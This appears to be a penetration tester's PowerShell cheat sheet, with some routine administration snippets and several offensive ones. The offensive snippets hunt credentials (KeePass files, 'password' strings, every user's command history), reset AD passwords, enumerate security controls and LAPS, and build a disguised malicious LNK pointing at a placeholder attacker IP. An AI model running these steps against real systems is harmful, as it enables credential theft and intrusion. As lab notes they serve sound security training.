# Using PowerShell

Various snippets.

## Creating a Credential Object

```powershell
$user = "DOMAIN\luser"
$pass = "Secr1tP4ss!"
$sspass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ($user, $sspass)
```

## Changing Another User's Password

```powershell
Set-ADAccountPassword -Identity "luser" -NewPassword (ConvertTo-SecureString "NewPassword123" -AsPlainText -Force) -Reset
```

## Using `EnterPSSession` to Access Another Machine

```powershell
Enter-PSSession -ComputerName COMPUTER-MS01 -Credential $cred
```

## Finding Files

```powershell
Get-PSDrive -PSProvider FileSystem | % { Get-ChildItem $_.Root -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue }
```

## Searching Files

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.xml,*.ini,*.txt,*.config | Select-String -Pattern "password" | Format-Table Path, LineNumber, Line
```

## PowerShell History

For all users:

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## Show Installed Programs

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

## Show Scheduled Tasks

```powershell
Get-ScheduledTask | select TaskName,State
```

## Make a `.zip` Archive

```powershell
Compress-Archive -Path C:\Reference\*.* -DestinationPath C:\Archives\Draft.zip
```

## Expand a `.zip` Archive

```powershell
Expand-Archive -Path "C:\path\to\archive.zip" -DestinationPath "C:\path\to\extract\folder"
```

## Show Processes with Users

```powershell
Get-Process | Select-Object Name, Id, @{Name='UserName';Expression={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User}} | Format-Table -AutoSize

```

## Enumerating Windows Security Controls

Check status of Windows Defender with: `Get-MpComputerStatus`

AppLocker: `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Constrained Language Mode: `$ExecutionContext.SessionState.LanguageMode`

LAPS:

- `Find-LAPSDelegatedGroups`
- `Find-AdmPwdExtendedRights`
- `Get-LAPSComputers`

## Install `activedirectory` PowerShell Module

e.g. for HTB hosts that don't have it enabled by default and don't have Internet access.

```powershell
Add-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
```

## Create a Malicious `LNK`

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\totally-legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@legit.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Important Security Update"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Convert a File to Base64

```powershell
[IO.File]::WriteAllText( "/users/luser/x.b64", [Convert]::ToBase64String( [IO.File]::ReadAllBytes("/users/luser/x.zip")))
```

## Test if a TCP Port is Open

```powershell
Test-NetConnection -ComputerName 192.168.1.1 -Port 443
```
